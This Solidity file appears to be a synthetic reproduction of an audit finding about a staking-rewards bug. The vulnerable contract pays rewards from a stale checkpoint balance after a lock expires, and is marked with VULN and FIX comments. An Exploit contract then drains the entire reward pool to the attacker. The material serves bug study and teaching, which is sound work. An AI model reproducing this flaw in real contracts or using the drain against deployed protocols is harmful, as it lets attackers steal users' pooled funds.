// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  veRAACToken — rewards keep using balanceOfAt(lastUserBlock) after unlock
    (Pashov, finding #66340)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: getNewUserRewards reads voting power at the stored checkpoint
    block. After unlock, balanceOf is 0, but the checkpoint is not. */

contract RewardToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VeRewards {
    uint256 public constant FINDING_ID = 66340;
    uint256 public constant PRECISION = 1e18;
    RewardToken public reward;
    uint256 public rewardPerTokenStored;
    uint256 public claimed;

    struct Lock {
        uint256 power;
        uint256 unlockTime;
    }

    struct UserRewardData {
        uint256 lastUserBlock;
        uint256 userRewardPerTokenPaid;
    }

    mapping(address => Lock) public locks;
    mapping(address => mapping(uint256 => uint256)) public powerAt;
    mapping(address => mapping(address => UserRewardData)) public userRewardData;

    constructor(RewardToken reward_) {
        reward = reward_;
        reward_.mint(address(this), 1000 ether);
    }

    function lock(address user, uint256 power) external {
        locks[user] = Lock({power: power, unlockTime: 0});
        powerAt[user][0] = power;
        userRewardData[user][address(reward)].lastUserBlock = 0;
    }

    function balanceOf(address user) public view returns (uint256) {
        Lock memory l = locks[user];
        if (l.power == 0) return 0;
        if (block.timestamp >= l.unlockTime) return 0;
        return l.power;
    }

    function balanceOfAt(address user, uint256 atBlock) public view returns (uint256) {
        return powerAt[user][atBlock];
    }

    function rewardPerToken(address) public view returns (uint256) {
        return rewardPerTokenStored;
    }

    function notify(uint256 index) external {
        rewardPerTokenStored = index;
    }

    function getNewUserRewards(address user, address token) public view returns (uint256) {
        UserRewardData memory uData = userRewardData[user][token];
        uint256 userPower = balanceOfAt(user, uData.lastUserBlock);
        // FIX: userPower = balanceOf(user);
        uint256 stored = rewardPerToken(token);
        return userPower * (stored - uData.userRewardPerTokenPaid) / PRECISION; // @> VULN: checkpoint power is paid after expiry
    }

    function currentRewards(address user) public view returns (uint256) {
        uint256 userPower = balanceOf(user);
        return userPower * rewardPerTokenStored / PRECISION;
    }

    function claim(address user) external returns (uint256 amount) {
        amount = getNewUserRewards(user, address(reward));
        reward.transfer(user, amount);
        claimed = amount;
    }
}

contract Exploit {
    uint256 public constant FINDING_ID = 66340;
    RewardToken public token;
    VeRewards public ve;
    uint256 public paid;
    uint256 public live;

    constructor() {
        token = new RewardToken();
        ve = new VeRewards(token);
    }

    function run() external {
        address attacker = msg.sender;
        ve.lock(attacker, 1000 ether);
        live = ve.balanceOf(attacker);
        ve.notify(1e18);
        paid = ve.claim(attacker);
        require(live == 0, "not expired");
        require(paid == 1000 ether, "stale rewards");
        require(ve.currentRewards(attacker) == 0, "live power pays 0");
        require(token.balanceOf(attacker) == 1000 ether, "drained");
        require(token.balanceOf(address(ve)) == 0, "pool empty");
    }
}
